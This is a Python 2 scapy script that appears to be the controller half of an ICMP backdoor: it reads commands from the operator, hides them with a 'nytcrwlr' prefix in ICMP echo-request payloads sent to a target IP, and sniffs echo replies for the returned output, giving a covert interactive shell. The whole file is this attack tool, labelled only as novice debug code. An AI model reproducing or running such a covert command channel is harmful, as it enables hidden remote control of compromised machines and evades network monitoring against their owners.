#!/usr/bin/python

#importing modules
from scapy.all import *
import threading
import time

#this code is still in debug mode and has lots of print statements for debugging
#modify as required but this is definately of very novice level

def send(ip_target):
	while 1:
		print "[+]Entering a loop..."
		icmp = ICMP()
		ip = IP()
		icmp.type = 8
		icmp.code = 0
		ip.dst = ip_target
		data = "nytcrwlr"
		data = data + raw_input("#")
		data = data.strip("\r").strip("\n").lower()
		print data
		if data == "nytcrwlrexit":
			packt = sr1(ip/icmp/data)
			sys.exit(0)
		else:
			print "[+]sending data"
			packt = sr1(ip/icmp/data,timeout=1)
			print "[+]sent!"
			output(ip_target)

def output(ip_target):
	flag = 1
	print "[+]waiting for response"
	while flag:
		print "[+]waiting"
		resp = sniff(iface="eth0", timeout=2)
		for packet in resp:
			print "Loop[1]"
			if packet.haslayer(ICMP):
				print "Loop[2]"
				if str(packet.getlayer(ICMP).type) == "0":
					flag = 0
					print "[+]type code 0 got!"
					out = packet.getlayer(Raw).load[0:]
					print "data: " + str(out)
					print "send packet to end server sr1"
					icmp = ICMP()
					ip = IP()
					icmp.type = 8
					icmp.code = 0
					ip.dst = ip_target
					sr1(ip/icmp,timeout=1)
					print "[+]done"
					send(ip_target)

def main():
	print "[+]starting..."
	ip_target = raw_input("[+]Enter the Target IP address: ")
	send(ip_target)

if __name__ == "__main__":
	main()
